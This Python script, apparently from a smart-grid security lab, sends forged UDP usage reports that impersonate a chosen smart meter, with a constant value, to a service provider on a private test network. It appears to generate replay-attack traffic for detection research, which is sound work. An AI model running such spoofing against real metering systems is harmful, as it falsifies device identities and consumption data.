# attack_replay.py
# Replay Attack (SM → SP)

import socket
import json
import time
import sys

SP_IP = "10.0.3.1"
SP_PORT = 9999

REG_MAP = {
    "sm1": "10.0.1.254", "sm2": "10.0.1.254", "sm3": "10.0.1.254",
    "sm4": "10.0.1.254", "sm5": "10.0.1.254",
    "sm6": "10.0.2.254", "sm7": "10.0.2.254", "sm8": "10.0.2.254",
    "sm9": "10.0.2.254", "sm10": "10.0.2.254"
}

REPLAY_USAGE = 2.75       # identical value every time
SEND_INTERVAL = 0.5       # slow → avoids DoS, triggers replay


def run_replay(sm_id):
    if sm_id not in REG_MAP:
        print("[ERROR] Invalid SM ID")
        return

    reg_ip = REG_MAP[sm_id]
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print("[♻️ REPLAY ATTACK STARTED]")
    print(f"[!] SM ID     : {sm_id}")
    print(f"[!] REG ID    : {reg_ip}")
    print(f"[!] SP Target : {SP_IP}:{SP_PORT}")
    print(f"[!] Usage     : {REPLAY_USAGE} (constant)")
    print("-" * 50)

    try:
        while True:
            payload = {
                "reg_id": reg_ip,
                "smId": sm_id,
                "usage": REPLAY_USAGE,
                "proto": "udp",
                "service": "-",
                "timestamp": time.time()
            }

            sock.sendto(json.dumps(payload).encode(), (SP_IP, SP_PORT))
            time.sleep(SEND_INTERVAL)

    except KeyboardInterrupt:
        print("\n[!] REPLAY ATTACK STOPPED")
        sock.close()


# ---------------- MAIN ----------------
if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 attack_replay.py <smId>")
        sys.exit(1)

    run_replay(sys.argv[1])
